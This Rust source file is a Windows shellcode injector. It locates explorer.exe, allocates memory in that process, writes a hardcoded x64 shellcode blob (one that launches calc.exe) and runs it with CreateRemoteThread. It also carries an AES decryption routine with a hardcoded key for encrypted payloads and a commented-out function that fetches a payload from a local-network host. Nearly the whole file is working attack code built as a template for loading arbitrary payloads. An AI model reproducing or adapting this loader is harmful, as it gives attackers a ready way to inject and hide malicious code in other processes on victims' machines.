use sysinfo::{ProcessExt, System, SystemExt, PidExt};
use windows::{Win32::{System::{Memory::{VirtualAllocEx, MEM_RESERVE, PAGE_READWRITE, MEM_COMMIT, VirtualProtectEx, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS}, Threading::{OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, CreateRemoteThread, WaitForSingleObject, LPTHREAD_START_ROUTINE}, Diagnostics::Debug::WriteProcessMemory}, Foundation::CloseHandle}};
use windows::Win32::Foundation::HANDLE;
use crypto::{symmetriccipher::{Decryptor, SymmetricCipherError}, aes::{self, cbc_decryptor}, blockmodes, buffer::{self, RefReadBuffer, RefWriteBuffer, BufferResult, WriteBuffer, ReadBuffer}};
use core::ffi::c_void;
use core::ptr;
use std::ptr::null;

fn decrypt(sc: &[u8]) -> Result<Vec<u8>, SymmetricCipherError> {
    let key : [u8;16] = [0x2d,0x46,0xc6,0x15,0x22,0xee,0xa0,0x29,0x7,0x58,0xb7,0x58,0x53,0x78,0xa7,0xba];
    let iv : [u8;16] = [0xb4,0x92,0xa9,0xda,0xf9,0xb5,0x5c,0xff,0x4d,0x74,0x92,0x57,0xe6,0xdd,0xd5,0xb0];

    let mut decryptor : Box<dyn Decryptor> = cbc_decryptor(
        aes::KeySize::KeySize128,
        &key,
        &iv,
        blockmodes::PkcsPadding
    );
    const SIZE: usize = u8::MAX as usize;

    let mut dsc : Vec<u8> = Vec::<u8>::new();
    let mut read_buffer : RefReadBuffer = buffer::RefReadBuffer::new(&sc);
    let mut buffer : [u8; SIZE] = [0; SIZE];
    let mut write_buffer : RefWriteBuffer = buffer::RefWriteBuffer::new(&mut buffer);


    loop {
        let dec : BufferResult = decryptor.decrypt(&mut read_buffer, &mut write_buffer, true)?;
        dsc.extend(write_buffer.take_read_buffer().take_remaining().iter().map(|&i| i));
        match dec {
            BufferResult::BufferUnderflow => break,
            BufferResult::BufferOverflow => { }
        }
    }

    Ok(dsc)
}

fn find_proc(name: &str) -> u32 {
    let mut sys: System = System::new_all();

    sys.refresh_all();

    let mut pid: u32 = 0;

    for (proc_id, process) in sys.processes() {
        if process.name().to_lowercase() == name {
            pid = proc_id.as_u32();
            break;
        }
    }
    return pid;
}

fn get_data() -> Result<Vec<u8>, reqwest::Error> {
    let resp = reqwest::blocking::get("http://192.168.1.188/test.txt")?.bytes()?;

    return Ok(resp.to_vec());
}

fn main() {

    let proc: &str = "explorer.exe";

    println!("[+] Finding process");
    let pid: u32 = find_proc(&proc);

    if pid == 0 {
       panic!("[!] Process not found!"); 
    }

    //let sc: Vec<u8> = get_data().unwrap();

    let mut dsc: [u8;276] = [
    0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
    0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
    0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
    0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
    0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
    0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
    0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
    0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
    0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
    0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
    0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
    0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
    0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
    0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
    0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
    0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
    0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
    0x63,0x2e,0x65,0x78,0x65,0x00];

    //let sc_len: usize = sc.len();
    let sc_len: usize = dsc.len();

    //let dsc: Vec<u8> = decrypt(&sc).unwrap();

    unsafe {
        println!("[+] Opening handle to process");
        let h_proc: HANDLE = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
            false,
            pid).expect("Could not open process");

        println!("[+] Allocating memory");
        let exec_mem: *mut c_void = VirtualAllocEx(
            h_proc,
            ptr::null(),
            sc_len,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READ
        );

        println!("[+] Copying {sc_len} bytes into memory");
        let num_written: *mut usize = ptr::null_mut();
        WriteProcessMemory(
            h_proc,
            exec_mem,
            dsc.as_mut_ptr() as *mut c_void,
            sc_len,
            num_written
        );

        let old: *mut PAGE_PROTECTION_FLAGS = ptr::null_mut();

        let e_mem: extern "system" fn(*mut c_void) -> u32 = { std::mem::transmute(exec_mem) };

        println!("[+] Creating thread");
        let h_thread: HANDLE = CreateRemoteThread(
            h_proc,
            ptr::null_mut(),
            0,
            Some(e_mem),
            null(),
            0,
            ptr::null_mut()
        ).unwrap();

        println!("[+] Executing thread");
        WaitForSingleObject(h_thread, 500);
        CloseHandle(h_thread);
    }

}
